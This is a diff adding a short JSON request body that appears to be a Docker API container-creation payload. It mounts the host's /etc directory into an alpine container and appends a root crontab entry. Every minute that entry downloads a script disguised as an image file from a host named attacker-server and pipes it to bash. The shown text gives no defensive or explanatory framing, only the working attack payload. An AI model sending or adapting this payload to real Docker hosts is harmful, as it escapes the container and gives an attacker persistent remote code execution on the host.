@@ -1,0 +1,7 @@
+{
+    "Cmd": ["/bin/sh", "-c", "echo '* * * * * curl -s http://attacker-server:8220/logo3.jpg | bash -s' >> /mnt/etc/crontabs/root && touch /mnt/etc/crontabs/cron.update && sleep 300"],
+    "Image": "alpine:latest",
+    "HostConfig": {
+	"Binds": ["/etc:/mnt/etc"]
+    }
+}
